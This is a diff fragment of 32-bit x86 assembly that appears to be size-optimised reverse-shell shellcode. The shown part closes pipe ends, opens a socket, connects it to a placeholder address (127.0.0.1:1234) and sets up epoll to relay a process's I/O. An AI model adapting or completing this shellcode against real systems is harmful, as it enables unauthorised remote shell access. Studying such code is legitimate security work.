@@ -88,8 +88,8 @@ endstruc
 struc sc_prop
   p_in  resd 2
   p_out resd 2
-  s     resd 1
   pid   resd 1
+  s     resd 1  
   efd   resd 1
   len   resd 1
   evt   resd 1  
@@ -176,13 +176,13 @@ cls_pipes:
       mov    ebx, esp
       int    0x80
 opn_con:    
-      ; close(p.in[0]);
+      ; close(in[0]);
       push   SYS_close
       pop    eax
       mov    ebx, [ebp+p_in]    
       int    0x80    
 
-      ; close(p.out[1]);
+      ; close(out[1]);
       push   SYS_close
       pop    eax      
       mov    ebx, [ebp+p_out+4]    
@@ -199,7 +199,7 @@ opn_con:
       push   2                 ; family   = AF_INET
       mov    ecx, esp          ; ecx      = &args
       int    0x80
-      mov    [ebp+s], eax
+      stosd
 
       push   0x0100007f        ; sa.sin_addr=127.0.0.1
       push   0xD2040002        ; sa.sin_port=htons(1234), sa.sin_family=AF_INET
@@ -208,7 +208,7 @@ opn_con:
       ; connect (s, &sa, sizeof(sa));    
       push   0x10              ; sizeof(sa)      
       push   ecx               ; &sa
-      push   ebx               ; s
+      push   eax               ; s
       mov    ecx, esp          ; &args
       push   SYS_CONNECT
       pop    ebx               ; ebx=SYS_CONNECT
@@ -221,7 +221,7 @@ opn_con:
       pop    eax
       xor    ebx, ebx
       int    0x80
-      mov    [ebp+efd], eax
+      stosd
       
       test   eax, eax
       jle    shutdown
